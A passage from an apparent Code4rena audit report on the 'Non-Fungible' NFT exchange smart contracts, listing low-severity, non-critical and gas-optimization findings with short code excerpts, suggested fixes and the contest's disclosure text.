DApps like Tenderly. Error definitions should be added to the require block, not exceeding 32 bytes.\n\n## [L-09] Fee recipient may be address(0)\n\n### Context\n\n```solidity\n\ncontracts/Exchange.sol:\n\t600:             _transferTo(paymentToken, from, fees[i].recipient, fee);\n```\n\n### Description\nThe recipient of a fee may be address(0), leading to lost ETH.\n\n## [L-10] Exchange.sol  `_execute` buy.order.side not validated\n\nIn `Exchhange.execute` , it is not validated that `buy.order.side == Side.Buy` (only the sell side is validated). With the current system, all policies ensure that, but it would also make sense to validate it in execute IMO. Future policies may not validate that and such a basic check should also not be the responsibility of a policy in my opinion.\n\n## [N-01] Not using the latest version of OpenZeppelin from dependencies\n\nThe package.json configuration file says that the project is using 4.6.0 of OpenZeppelin which has a not last update version\n\n```js\n\npackage.json:\n\t61:     \"@openzeppelin/contracts\": \"4.4.1\",\n\t62:     \"@openzeppelin/contracts-upgradeable\": \"^4.6.0\",\n```\n\n### Recommended Mitigation Steps\n\nUse patched versions\n\n## [N-02] No same value input control\n\n```solidity\n\ncontracts/Exchange.sol:\n\t340  \n\t341:     function setOracle(address _oracle)\n\t342:         external\n\t343:         onlyOwner\n\t344:     {\n\t345:         require(_oracle != address(0), \"Address cannot be zero\");\n\t346:         oracle = _oracle;\n\t347:         emit NewOracle(oracle);\n\t348:     }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd code like this;\n`if (oracle == _oracle revert ADDRESS_SAME();`\n\n## [N-03] `0 address` check\n\n0 address control should be done in these parts;\n\n[Exchange.sol#L130](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L130)\n\n### Recommended Mitigation Steps\n\nAdd code like this;<br>\n`if (oracle == address(0)) revert ADDRESS_ZERO();`\n\n## [N-04] Omissions in Events\n\nThroughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters\n\nThe events should include the new value and old value where possible:\n\nEvents with no old value;\n\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L329<br>\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L338<br>\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L347<br>\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L355<br>\n\n## [NC-05] Add parameter to Event-Emit\n\nSome event-emit description hasn’t parameter. Add to parameter  for front-end website or client app , they can has that something has happened on the blockchain.\n\nEvents with no old value;\n\n```solidity\n\n2 results - 1 files\n\ncontracts/Exchange.sol:\n\t 58:         emit Opened();\n\n\t 62:         emit Closed();\n```\n\n## [N-06] Include ``return parameters`` in _NatSpec comments_\n\n### Context\n\nAll Contracts\n\nhttps://docs.soliditylang.org/en/v0.8.15/natspec-format.html\n\nIf Return parameters are declared, you must prefix them with \"/// @return\".\n\nSome code analysis programs do analysis by reading NatSpec details, if they can't see the \"@return\" tag, they do incomplete analysis.\n\n### Recommended Mitigation Steps\n\nInclude return parameters in NatSpec comments\n\nRecommendation Code Style:\n ```js\n\t\t/// @notice information about what a function does\n\t\t/// @param pageId The id of the page to get the URI for.\n\t\t/// @return Returns a page's URI if it has been minted \n\t\tfunction tokenURI(uint256 pageId) public view virtual override returns (string memory) {\n\t\t\t\tif (pageId == 0 || pageId > currentId) revert(\"NOT_MINTED\");\n\n\t\t\t\treturn string.concat(BASE_URI, pageId.toString());\n\t\t}\n```\n\n## [N-07] Solidity compiler optimizations can be problematic\n\n```js\nhardhat.config.ts:\n\t69    },\n\t70:   solidity: {\n\t71:     compilers: [\n\t72:       {\n\t73:         version: '0.8.17',\n\t74:         settings: {\n\t75:           metadata: {\n\t76:             bytecodeHash: 'none',\n\t77:           },\n\t78:           optimizer: {\n\t79:             enabled: true,\n\t80:             runs: 800,\n\t81:           },\n\n```\n\n### Description\n\nProtocol has enabled optional compiler optimizations in Solidity.\nThere have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. \n\nTherefore, it is unclear how well they are being tested and exercised.\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. \n\nAnother high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.\n\nExploit Scenario\nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the contracts.\n\n### Recommended Mitigation Steps\n\nShort term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.<br>\nLong term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.\n\n## [N-08] NatSpec is missing \n\n### Description\n\nNatSpec is missing for the following functions , constructor and modifier:\n\n```solidity\n10  results\n\ncontracts/Pool.sol:\n\t70:     function _transfer(address from, address to, uint256 amount) private {\n\n\t79:     function balanceOf(address user) public view returns (uint256) {\n\n\t83:     function totalSupply() public view returns (uint256) {\n\ncontracts/Exchange.sol:\n\t35:     modifier whenOpen() {\n\n\t40:     modifier setupExecution() {\n\t47: \n\t48:     modifier internalCall() {\n\t52: \n\t53:     event Opened();\n\t54:     event Closed();\n\t55: \n\t56:     function open() external onlyOwner {\n \n\t60:     function close() external onlyOwner {\n\n```\n\n## [N-09] Signature Malleability of EVM's ecrecover()\n\n```solidity\n\ncontracts/Exchange.sol:\n\t523          require(v == 27 || v == 28, \"Invalid v parameter\");\n\t524:         address recoveredSigner = ecrecover(digest, v, r, s);\n\t525          if (recoveredSigner == address(0)) {\n\n```\n\n### Description\n\nDescription: The function calls the Solidity ecrecover() function directly to verify the given signatures. However, the ecrecover() EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks.\n\nAlthough a replay attack seems not possible for this contract, I recommend using the battle-tested OpenZeppelin's ECDSA library.\n\n### Recommended Mitigation Steps\n\nUse the ecrecover function from OpenZeppelin's ECDSA library for signature verification. (Ensure using a version > 4.7.3 for there was a critical bug >= 4.1.0 < 4.7.3).\n\n## [N-10] Lines are too long\n\nUsually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length.<br>\nReference:<br>\nhttps://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\n\n```solidity\n\ncontracts/Exchange.sol:\n\t546:             (canMatch, price, tokenId, amount, assetType) = IMatchingPolicy(sell.matchingPolicy).canMatchMakerAsk(sell, buy);\n\n\t550:             (canMatch, price, tokenId, amount, assetType) = IMatchingPolicy(buy.matchingPolicy).canMatchMakerBid(buy, sell);\n\n```\n\n## [N-11] Stop using `v != 27 && v != 28 or v == 27 || v == 28`\n\n```solidity\ncontracts/Exchange.sol:\n\n\t523:         require(v == 27 || v == 28, \"Invalid v parameter\");\n```\n\nSee this for reference:<br>\nhttps://twitter.com/alexberegszaszi/status/1534461421454606336?s=20&t=H0Dv3ZT2bicx00hLWJk7Fg\n\n\n## [N-12] `Empty blocks` should be *removed* or *Emit* something\n\n### Description\n\nCode contains empty block\n\n```js\n2 results - 2 files\n\ncontracts/Exchange.sol:\n66:     function _authorizeUpgrade(address) internal override onlyOwner {}\n\ncontracts/Pool.sol:\n15:     function _authorizeUpgrade(address) internal override onlyOwner {}\n```\n\n### Recommended Mitigation Steps\n\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.\n\n## [N-13] Signature scheme does not support smart contracts\n\nNon-Fungible does not support EIP 1271 and therefore no signatures that are validated by smart contracts. This limits the applicability for protocols that want to build on top of it and persons that use smart contract wallets. Consider implementing support for it.<br>\nhttps://eips.ethereum.org/EIPS/eip-1271\n\n## [S-01] Generate perfect code headers every time\n\n### Description\n\nI recommend using header for Solidity code layout and readability\n\nhttps://github.com/transmissions11/headers\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 29 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/34) by **ReyAdmirado** received the top score from the judge.\n\n*The following wardens also submitted reports: [Deivitto](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/228), [lukris02](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/223), [c3phas](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/220), [0x4non](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/218), [Aymen0909](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/217), [saian](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/208), [0xRoxas](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/203), [Sathish9098](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/199), [ch0bu](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/152), [ajtra](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/144), [rotcivegaf](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/133), [Awesome](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/131), [Diana](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/125), [Rahoz](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/122), [carlitox477](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/104), [shark](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/100), [cryptostellar5](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/98), [erictee](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/92), [zaskoh](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/82), [trustindistrust](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/79), [martin](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/77), [aphak5010](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/70), [0xab00](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/57), [Rolezn](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/55), [RaymondFam](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/46), [IllIllI](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/38), [Bnke0x0](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/19), and [aviggiano](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/18).*\n\n## Summary\n\n| | issue |\n| ----------- | ----------- |\n| G&#8209;01 | Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate |\n| G&#8209;02 | State variables can be packed into fewer storage slots |\n| G&#8209;03 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if` statement |\n| G&#8209;04 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables |\n| G&#8209;05 | Not using the named return variables when a function returns, wastes deployment gas |\n| G&#8209;06 | Can make the variable outside the loop to save gas |\n| G&#8209;07 | `++i/i++` should be `unchecked{++i}/unchecked{i++}` when it is not possible for them to overflow, as is the case when used in for-loop and while-loops |\n| G&#8209;08 | `require()`/`revert()` strings longer than 32 bytes cost extra gas |\n| G&#8209;09 | `require()` or `revert()` statements that check input arguments should be at the top of the function |\n| G&#8209;10 | Internal functions only called once can be inlined to save gas |\n| G&#8209;11 | Usage of uint/int smaller than 32 bytes (256 bits) incurs overhead |\n| G&#8209;12 | Bytes constants are more efficient than string constants |\n| G&#8209;13 | Public functions not called by the contract should be declared external instead |\n| G&#8209;14 | should use arguments instead of state variable |\n\n## [G-01] Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate\n\nIf both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations. \n\n`cancelledOrFilled` and `nonces` are both being used in the same functions mostly consider making them a struct instead \n- [Exchange.sol#L85](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L85)\n- [Exchange.sol#L86](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L86)\n\n## [G-02] State variables can be packed into fewer storage slots\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables are also cheaper.\n\nConsider making this state var near one of the address types (doesnt matter which because its not used in the same functions)\n- [Exchange.sol#L146](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L146)\n\n## [G-03] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if` statement\n\n`require(a <= b); x = b - a => require(a <= b); unchecked { x = b - a }`<br>\n`if(a <= b); x = b - a => if(a <= b); unchecked { x = b - a }`<br>\nThis will stop the check for overflow and underflow so it will save gas\n\n- [Exchange.sol#L607](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L607)\n\n## [G-04] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables\nUsing the addition operator instead of plus-equals saves gas\n\n- [Exchange.sol#L316](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L316)\n- [Exchange.sol#L574](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L574)\n\n## [G-05] Not using the named return variables when a function returns, wastes deployment gas\n\n- [Exchange.sol#L540](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L540)\n\n## [G-06] Can make the variable outside the loop to save gas\n\nMake it outside and only use it inside.\n\n- [Exchange.sol#L599](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L599)\n\n## [G-07] `++i/i++` should be `unchecked{++i}/unchecked{i++}` when it is not possible for them to overflow, as is the case when used in for-loop and while-loops\n\nIn Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n- [Exchange.sol#L184](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L184)\n- [Exchange.sol#L307](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L307)\n- [Exchange.sol#L598](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L598)\n\n## [G-08] `require()`/`revert()` strings longer than 32 bytes cost extra gas\n\nEach extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas.\n\n- [Exchange.sol#L49](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L49)\n- [Exchange.sol#L295](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L295)\n- [Exchange.sol#L604](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L604)\n\n- [Pool.sol#L63](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L63)\n\n## [G-09] `require()` or `revert()` statements that check input arguments should be at the top of the function\n\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas*) in a function that may ultimately revert in the unhappy case.\n\n- [Pool.sol#L71-L72](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L71-L72)\n\n## [G-10] Internal functions only called once can be inlined to save gas\n\nNot inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.\n\n`_canMatchOrders`\n- [Exchange.sol#L537](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L537)\n\n`_executeFundsTransfer`\n- [Exchange.sol#L565](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L565)\n\n`_transferFees`\n- [Exchange.sol#L591](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L591)\n\n`_executeTokenTransfer`\n- [Exchange.sol#L653](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L653)\n\n`_validateUserAuthorization`\n- [Exchange.sol#L440](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L440)\n\n`_validateOracleAuthorization`\n- [Exchange.sol#L471](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L471)\n\n## [G-11] Usage of uint/int smaller than 32 bytes (256 bits) incurs overhead\n\nWhen using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.<br>\nEach operation involving a uint8 costs an extra 22-28 gas (depending on whether the other operand is also a variable of type uint8) as compared to ones involving uint256, due to the compiler having to clear the higher bits of the memory word before operating on the uint8, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.<br>\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html<br>\nUse a larger size then downcast where needed.\n\n- [Exchange.sol#L84](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L84)\n- [Exchange.sol#L307](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L307)\n- [Exchange.sol#L443](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L443)\n- [Exchange.sol#L479](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L479)\n- [Exchange.sol#L519](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L519)\n- [Exchange.sol#L598](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L598)\n\n## [G-12] Bytes constants are more efficient than string constants\n\nIf data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity.\n\n- [Exchange.sol#L70](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L70)\n- [Exchange.sol#L71](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L71)\n\n## [G-13] Public functions not called by the contract should be declared external instead\n\nContracts are allowed to override their parents’ functions and change the visibility from external to public and can save gas by doing so. \n\n`withdraw`\n- [Pool.sol#L44](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L44)\n\n`transferFrom`\n- [Pool.sol#L58](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L58)\n\n`balanceOf`\n- [Pool.sol#L79](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L79)\n\n`totalSupply`\n- [Pool.sol#L83](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L83)\n\n## [G-14] Should use arguments instead of state variable\n\nThis will save near 97 gas\n\n- [Exchange.sol#L329](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L329)\n- [Exchange.sol#L338](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L338)\n- [Exchange.sol#L347](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L347)\n- [Exchange.sol#L355](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L355)\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}